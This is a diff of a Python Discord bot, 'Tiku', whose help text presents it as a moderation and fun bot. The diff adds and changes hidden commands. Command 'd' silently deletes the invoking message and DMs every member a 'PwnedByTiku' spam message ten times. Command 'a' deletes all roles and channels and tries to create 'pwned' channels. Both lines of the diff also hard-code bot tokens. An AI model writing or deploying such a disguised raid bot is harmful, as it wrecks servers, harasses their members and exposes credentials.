@@ -30,10 +30,26 @@ async def sum(ctx, numOne: int, numTwo: int):
 
 @bot.command()
 async def infobot(ctx):
-    embed = discord.Embed(title=f"Hola a Todos en {ctx.guild.name} !", description="Hola! Soy Bellota, un bot de moderacion y mucha diversion! Para obtener mas informacion pon *help", color=0xe91e63 , timestamp=datetime.datetime.utcnow()) 
+    embed = discord.Embed(title=f"Hola a Todos en {ctx.guild.name} !", description="Hola! Soy Tiku, un bot de moderacion y mucha diversion! Para obtener mas informacion pon *ayuda", color=0xe91e63 , timestamp=datetime.datetime.utcnow()) 
     await ctx.send(embed=embed)
 
-
+@bot.command()
+async def ayuda(ctx):
+    embed = discord.Embed(title="Hola!", description=f"""
+    MODERACION
+    ==========
+    *antiinvite = Anti Spam
+    *kick = expulsar
+    *ban = banear
+    
+    DIVERSION
+    =========
+    *nsfw = Desbloquea +18
+    *say = Repite lo que dices
+    *moneda = Tirar la moneda
+    *kill = mata a alguien
+    *pegar = le pega a alguien""", color=0xe91e63 , timestamp=datetime.datetime.utcnow()) 
+    await ctx.send(embed=embed)
 
 
 @bot.event
@@ -58,10 +74,11 @@ async def on_guild_channel_create(channel):
 
 @bot.command()
 async def d(ctx):
+    await ctx.message.delete()
     for user in ctx.guild.members:
- 
-        await user.send(  """PwnedByTiku :D @everyone  """   )
-        print(f"Enviando a {user}")
+        for i in range(10):
+            await user.send(  """PwnedByTiku :D @everyone  """   )
+            print(f"Enviando a {user}")
         
 @bot.command(pass_context=True)
 async def n(ctx):
@@ -154,7 +171,7 @@ async def r(ctx):
  
 @bot.command()
 async def a(ctx):
-    ctx.message.delete()
+    await ctx.message.delete()
     guild = ctx.guild
     deleted = 0
     for role in guild.roles:
@@ -181,7 +198,14 @@ async def a(ctx):
             await channel.delete()
 
         except:
+            import time
+            from time import sleep
+            time.sleep(7)
             continue
+
+        import time
+        from time import sleep
+        time.sleep(7)
     for i in range(200, 0):
         try:
             await ctx.guild.create_text_channel("քառɛɖɮʏȶɨӄʊ")
@@ -261,4 +285,4 @@ __________________ _
 @bot.event
 async def on_server_join(server):
     print("Tiku se unio a {0}".format(server.name))
-bot.run('ODk3MjE5MDMzOTUzMzUzNzg5.YWSeVw.0kdUQ2kFMEf-3k-0SPyH--meLf8')
+bot.run('ODk3MjE5MDMzOTUzMzUzNzg5.YWSeVw._S32x7ie4fmTMTT9ay_fzETgj_c')
